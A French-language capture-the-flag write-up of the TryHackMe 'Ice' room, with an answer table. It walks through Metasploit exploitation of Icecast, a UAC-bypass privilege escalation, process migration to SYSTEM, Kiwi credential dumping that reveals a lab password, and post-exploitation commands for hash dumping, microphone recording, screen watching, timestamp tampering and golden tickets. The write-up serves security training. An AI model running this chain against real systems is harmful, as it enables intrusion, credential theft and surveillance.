# TryHackMe: Ice

**Objectif :** exploiter le service Icecast de la machine Windows, obtenir une session Meterpreter, elever les privileges jusqu'a un contexte SYSTEM, extraire les credentials du compte `Dark`, puis repondre a toutes les questions de post-exploitation de la room.

---

## Introduction

La room **Ice** fait partie de la serie debutant Windows de TryHackMe. Elle est guidee, mais elle reste tres utile parce qu'elle montre toute une chaine offensive typique sur Windows :

1. scan Nmap
2. identification du service vulnerable
3. exploitation via Metasploit
4. privilege escalation locale
5. migration de processus
6. credential dumping avec Kiwi
7. rappels de post-exploitation Meterpreter

Contrairement a une room type boot2root Linux, ici la valeur vient surtout de la comprehension de Meterpreter et des bons reflexes Windows.

---

## Task 1: Connect

Cette partie consiste uniquement a :

- telecharger le fichier OpenVPN
- se connecter au reseau TryHackMe
- verifier que l'etat `Connected` apparait sur la page Access

### Reponses

- Connect to our network using OpenVPN: `Done`
- Verify the VPN is connected: `Done`
- You are ready to use our machines: `Done`
- Deploy material and note the internal IP: `Done`

---

## Task 2: Recon

### Question 1: Deploy the machine! This may take up to three minutes to start.

Je deploie la cible depuis la room.

### Reponse

`Done`

### Question 2: Launch a scan against our target machine

Je lance le scan conseille :

```bash
nmap -Pn -sS -p- <IP>
```

Le but est d'identifier tous les ports TCP ouverts sans dependre de l'ICMP, car la machine ne repond pas au ping.

### Reponse

`Done`

### Question 3: What port is Microsoft Remote Desktop (MSRDP) open on?

Dans les resultats Nmap, le port RDP apparait comme :

```text
3389/tcp open ms-wbt-server
```

### Reponse

**MSRDP port:** `3389`

### Question 4: What service did nmap identify as running on port 8000? (First word of this service)

Le service expose sur `8000` est :

```text
Icecast
```

### Reponse

**Service on port 8000:** `Icecast`

### Question 5: What does Nmap identify as the hostname of the machine?

Le scan de version et d'OS detection identifie le hostname :

```text
DARK-PC
```

### Reponse

**Hostname:** `DARK-PC`

---

## Task 3: Gain Access

### Question 1: What is the full path of the exploitation module?

Le service `Icecast` sur le port 8000 est connu pour etre exploitable via un module Metasploit. Je lance :

```text
msfconsole
search icecast
```

Le module interessant est :

```text
exploit/windows/http/icecast_header
```

### Reponse

**Exploitation module:** `exploit/windows/http/icecast_header`

### Question 2: Select this module for use

Je le charge :

```text
use exploit/windows/http/icecast_header
```

### Reponse

`Done`

### Question 3: What is the only required setting which is blank?

En affichant les options :

```text
show options
```

Le seul parametre requis non renseigne est :

```text
RHOSTS
```

### Reponse

**Blank required setting:** `RHOSTS`

### Question 4: Set this option and run the exploit

Je configure les valeurs :

```text
set RHOSTS <IP>
set LHOST <MON_IP_THM>
run
```

Le module ouvre alors une session Meterpreter.

### Reponse

`Done`

---

## Task 4: Escalate

### Question 1: What's the name of the shell we have now?

Le module Icecast ouvre une session :

```text
meterpreter
```

### Reponse

**Shell name:** `meterpreter`

### Question 2: What user was running that Icecast process?

Je verifie le contexte de la session :

```text
getuid
```

Le processus Icecast tourne sous :

```text
Dark
```

### Reponse

**User running Icecast:** `Dark`

### Question 3: What build of Windows is the system?

Je recupere les infos systeme :

```text
sysinfo
```

Le build remonte a :

```text
7601
```

### Reponse

**Windows build:** `7601`

### Question 4: What is the architecture of the process we're running?

Toujours avec `sysinfo`, je vois que la session courante est sur une architecture :

```text
x64
```

### Reponse

**Architecture:** `x64`

### Question 5: Run local exploit suggester

Je lance :

```text
run post/multi/recon/local_exploit_suggester
```

### Reponse

`Done`

### Question 6: What is the full path for the first returned exploit?

Le premier exploit retourne par le suggester est :

```text
exploit/windows/local/bypassuac_eventvwr
```

### Reponse

**First returned exploit:** `exploit/windows/local/bypassuac_eventvwr`

### Question 7: Background the current session

Je mets la session en arriere-plan :

```text
background
```

### Reponse

`Done`

### Question 8: Select the exploit for use

```text
use exploit/windows/local/bypassuac_eventvwr
```

### Reponse

`Done`

### Question 9: Set the session

```text
set SESSION 1
```

### Reponse

`Done`

### Question 10: What is the name of the extra option we need to set?

Une fois la session definie, le nouveau parametre requis devient :

```text
LHOST
```

### Reponse

**Extra option name:** `LHOST`

### Question 11: Set this option now

Je definis mon IP THM :

```text
set LHOST <MON_IP_THM>
```

### Reponse

`Done`

### Question 12: Run the privilege escalation exploit

```text
run
```

Une nouvelle session s'ouvre.

### Reponse

`Done`

### Question 13: Interact with the new session

Je me connecte a la nouvelle session :

```text
sessions <ID>
```

### Reponse

`Done`

### Question 14: What permission listed allows us to take ownership of files?

Je verifie les privileges :

```text
getprivs
```

Le privilege correspondant est :

```text
SeTakeOwnershipPrivilege
```

### Reponse

**Privilege allowing file ownership takeover:** `SeTakeOwnershipPrivilege`

---

## Task 5: Looting

### Question 1: List the processes with `ps`

Je liste les processus :

```text
ps
```

### Reponse

`Done`

### Question 2: What's the name of the printer service?

Le processus qui remplit les conditions de stabilite et de privilege est :

```text
spoolsv.exe
```

### Reponse

**Printer service:** `spoolsv.exe`

### Question 3: Migrate to this process

Je migre la session :

```text
migrate -N spoolsv.exe
```

### Reponse

`Done`

### Question 4: What user is listed by `getuid`?

Apres migration :

```text
getuid
```

La session tourne maintenant sous :

```text
NT AUTHORITY\SYSTEM
```

### Reponse

**User after migration:** `NT AUTHORITY\SYSTEM`

### Question 5: Load Kiwi

```text
load kiwi
```

### Reponse

`Done`

### Question 6: Review the help menu

Je consulte l'aide :

```text
help
```

### Reponse

`Done`

### Question 7: Which command allows us to retrieve all credentials?

La commande est :

```text
creds_all
```

### Reponse

**Credential retrieval command:** `creds_all`

### Question 8: What is Dark's password?

J'extrais les credentials :

```text
creds_all
```

Le mot de passe de `Dark` apparait en clair :

```text
Password01!
```

### Reponse

**Dark's password:** `Password01!`

---

## Task 6: Post-Exploitation

### Question 1: Revisit the help menu

```text
help
```

### Reponse

`Done`

### Question 2: What command dumps all password hashes stored on the system?

La commande attendue est :

```text
hashdump
```

### Reponse

**Hash dumping command:** `hashdump`

### Question 3: What command allows us to watch the remote user's desktop in real time?

```text
screenshare
```

### Reponse

**Desktop watching command:** `screenshare`

### Question 4: What command records from a microphone attached to the system?

```text
record_mic
```

### Reponse

**Microphone recording command:** `record_mic`

### Question 5: What command modifies timestamps of files on the system?

```text
timestomp
```

### Reponse

**Timestamp modification command:** `timestomp`

### Question 6: What command allows us to create a golden ticket?

Avec Kiwi, la commande correspondante est :

```text
golden_ticket_create
```

### Reponse

**Golden ticket command:** `golden_ticket_create`

### Question 7: Enable RDP if needed

La room rappelle qu'on peut activer RDP avec :

```text
run post/windows/manage/enable_rdp
```

### Reponse

`Done`

---

## Task 7: Extra Credit

La room propose un exploit manuel depuis Exploit-DB pour sortir du cadre Metasploit. Cette partie n'attend pas de flag ni de reponse specifique ; elle sert surtout a encourager une exploitation plus manuelle du service Icecast.

### Reponse

`Done`

---

## Recapitulatif des reponses

| Question | Reponse |
|----------|---------|
| MSRDP port | `3389` |
| Service on 8000 | `Icecast` |
| Hostname | `DARK-PC` |
| Exploitation module | `exploit/windows/http/icecast_header` |
| Blank required setting | `RHOSTS` |
| Shell name | `meterpreter` |
| User running Icecast | `Dark` |
| Windows build | `7601` |
| Architecture | `x64` |
| First returned privesc exploit | `exploit/windows/local/bypassuac_eventvwr` |
| Extra option name | `LHOST` |
| File ownership privilege | `SeTakeOwnershipPrivilege` |
| Printer service | `spoolsv.exe` |
| User after migration | `NT AUTHORITY\SYSTEM` |
| Credential retrieval command | `creds_all` |
| Dark's password | `Password01!` |
| Hash dumping command | `hashdump` |
| Desktop watching command | `screenshare` |
| Microphone recording command | `record_mic` |
| Timestamp modification command | `timestomp` |
| Golden ticket command | `golden_ticket_create` |

---

## Points cles a retenir

- `sysinfo`, `getuid`, `getprivs` et `ps` sont les commandes Meterpreter de base a maitriser.
- Une privilege escalation "reussie" ne suffit pas toujours : il faut souvent **migrer** vers un bon processus pour exploiter `lsass`.
- `Kiwi` rend le credential dumping tres simple dans un lab comme celui-ci.
- La room est excellente pour apprendre le vocabulaire post-exploitation Windows sans se noyer dans la complexite.

---

**Auteur :** Saad Idrissi
